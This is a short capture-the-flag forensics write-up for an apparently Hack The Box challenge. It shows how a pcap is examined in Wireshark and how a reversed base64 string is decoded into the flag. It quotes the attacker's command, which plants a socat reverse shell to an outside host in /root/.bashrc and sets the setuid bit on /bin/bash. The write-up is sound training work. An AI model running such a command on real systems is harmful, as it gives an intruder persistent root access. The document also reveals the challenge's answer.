# forensics_wrong_spooky_season (1)

We open the pcap file, go in `Statistics` > `Conversations` > `TCP`

On the first conversation, we can `Follow Stream`

In the new window there is this line:
```bash
echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
ls -lha
```

This is obviously a base64 encoded string:
```bash
echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev
# SFRCe2o0djRfNXByMW5nX2p1c3RfYjNjNG0zX2o0djRfc3AwMGt5ISF9Cg==
```

Decoding the string gives the flag:
```bash
echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d
# HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```
